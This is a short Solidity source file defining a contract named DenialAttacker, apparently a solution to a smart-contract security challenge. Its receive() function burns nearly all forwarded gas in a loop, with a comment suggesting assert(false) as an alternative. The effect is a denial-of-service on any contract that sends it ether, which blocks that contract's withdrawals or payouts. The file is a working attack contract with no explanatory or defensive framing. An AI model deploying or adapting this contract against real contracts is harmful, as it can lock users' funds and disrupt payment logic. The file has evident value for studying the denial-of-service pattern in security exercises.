// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import 'hardhat/console.sol';

contract DenialAttacker {

    receive() external payable {
        while(gasleft() > 15000)
        {
            console.log(gasleft());
        }
        // or assert(false) for solidity 0.6.0
    }

}